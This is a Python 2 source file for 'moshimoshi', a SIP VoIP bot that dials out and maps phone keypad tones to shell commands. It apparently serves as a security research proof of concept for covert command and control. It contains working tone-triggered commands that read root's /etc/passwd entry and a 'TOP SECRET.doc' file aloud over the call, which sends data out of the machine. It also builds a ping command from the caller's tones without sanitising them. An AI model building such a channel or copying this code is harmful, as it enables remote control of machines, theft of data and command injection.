#!/usr/bin/python

#
# moshimoshi.py, VoIP Bot written in Python that uses SIP as VoIP Protocol, Text-to-speech engines for Output, and DTMF Tones for Input.
#
# Author: Itzik Kotler <itzik.kotler@security-art.com>
#

__version__ = "v0.1"

import sys
import os

from threading import Event

from time import sleep

from application.notification import NotificationCenter

from sipsimple.core import SIPURI, ToHeader
from sipsimple.audio import WavePlayer

from sipsimple.account import AccountManager
from sipsimple.application import SIPApplication
from sipsimple.storage import FileStorage
from sipsimple.configuration.settings import SIPSimpleSettings
from sipsimple.lookup import DNSLookup, DNSLookupError
from sipsimple.session import Session
from sipsimple.streams import AudioStream
from sipsimple.util import Route
from sipsimple.threading.green import run_in_green_thread

#

class BotApplication(SIPApplication):
	
	def __init__(self):
		SIPApplication.__init__(self)
		self.ended = Event()
		self.callee = None
		self.session = None
		self.audio_stream = None
		self.dtmf_buffer = ""
		notification_center = NotificationCenter()
		notification_center.add_observer(self)
	
	def press(self, tones):
		
		while self.audio_stream is None:
			self.audio_stream = [stream for stream in self.session.streams if isinstance(stream, AudioStream)][0]
		
		for tone in tones:
			self.audio_stream.send_dtmf(tone)
			print "Pressed DTMF " + tone
			sleep(1)
	
	def call(self, callee):
		self.callee = callee
                self.start(FileStorage('.'))
			
	@run_in_green_thread
	def _NH_SIPApplicationDidStart(self, notification):
		
	        #settings = SIPSimpleSettings()
	        # We don't need speakers or microphone
        	#settings.audio.input_device = None
	        #settings.audio.output_device = None
	        #settings.save()
		
		self.callee = ToHeader(SIPURI.parse(self.callee))
		try:
			routes = DNSLookup().lookup_sip_proxy(self.callee.uri, ['udp']).wait()
		except DNSLookupError, e:
			print 'DNS lookup failed: %s' % str(e)
		else:
			account = AccountManager().default_account
			self.session = Session(account)
			self.session.connect(self.callee, routes, [AudioStream(account)])
	
	def _NH_SIPSessionGotRingIndication(self, notification):
		print 'Ringing!'
	
	def _NH_SIPSessionDidStart(self, notification):
		print 'Session started!'
		print 'The microphone is now %s' % ('muted' if self.voice_audio_mixer.muted else 'unmuted')
		#self.voice_audio_mixer.muted = True
		#print 'The microphone is now %s' % ('muted' if self.voice_audio_mixer.muted else 'unmuted')
		session = notification.sender
	        self.audio_stream = session.streams[0]
				
	def _NH_SIPSessionDidFail(self, notification):
		print 'Failed to connect'
		self.stop()
	
	def _NH_SIPSessionDidEnd(self, notification):
		print 'Session ended'
		self.stop()
	
	def _NH_SIPApplicationDidEnd(self, notification):
		self.ended.set()
	
	def _NH_AudioStreamGotDTMF(self, notification):
		digit = notification.data.digit
		
		print 'Got DMTF %s ' % notification.data.digit
		
		self.dtmf_buffer += digit

		# '*' equal EOL
		
		if (digit == '*'):
			
			print "Processing %s" % self.dtmf_buffer
			
			# '0#*' eq Launching a pre-define application
			
			if (self.dtmf_buffer.startswith("0#") == True):
				print "Launching xeyes ..."
				os.system('xeyes &')
			
			# '1#*' eq Launching a pre-define application with arguments (i.e. 1#127#0#0#1#*)
			
			if (self.dtmf_buffer.startswith("1#") == True):
				ip_addr = self.dtmf_buffer.replace('#','.')[2:-1]
				print "Pinging %s ..." % ip_addr
				os.system("ping -c 5 %s" % ip_addr)
			
			# '2#*' eq Speaking out root's entry in /etc/passwd
			
			if (self.dtmf_buffer.startswith("2#") == True):
				print "Speaking /etc/passwd root's entry ..."
				os.system('cat /etc/passwd | grep "root" | head -1')
				
				os.system('cat /etc/passwd | grep "root" | head -1 | speak -s 120 -w /tmp/output.wav')
				
				result = WavePlayer(SIPApplication.voice_audio_mixer, '/tmp/output.wav', initial_play=False)
				self.audio_stream.bridge.add(result)
				result.start()
			
			# '3#*' eq Speaking out an arbitrary MS Document
			
			if (self.dtmf_buffer.startswith("3#") == True):
				print "Speaking /Users/Itzik/Desktop/TOP\ SECRET.doc content ..."
				
				os.system('catdoc /Users/Itzik/Desktop/TOP\ SECRET.doc | speak -s 120 -w /tmp/output.wav')
				
				result = WavePlayer(SIPApplication.voice_audio_mixer, '/tmp/output.wav', initial_play=False)
				self.audio_stream.bridge.add(result)
				result.start()
						
			# Flush DTMF Buffer
			
			self.dtmf_buffer = ""

#

def main(argc, argv):
	
	if (argc < 2):
		print "usage: %s <who@where:port>" % argv[0]
		return 1
	
	bot = BotApplication()
	
	bot.call("sip:" + argv[1])
	
	raw_input("Placing call to " + argv[1] + ", press Enter to quit the program\n")
	
	bot.session.end()
	
	bot.ended.wait()
	
# Entry point

if (__name__ == "__main__"):
	sys.exit(main(len(sys.argv), sys.argv))
